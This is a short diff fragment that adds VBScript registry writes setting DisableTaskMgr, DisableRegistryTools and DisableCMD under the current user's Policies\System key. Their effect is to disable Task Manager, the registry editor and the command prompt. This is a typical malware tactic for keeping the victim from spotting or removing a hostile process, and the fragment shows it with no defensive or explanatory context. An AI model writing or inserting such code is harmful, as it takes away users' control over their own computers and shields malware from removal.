@@ -1,0 +1,4 @@
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", 1, "REG_DWORD"
+
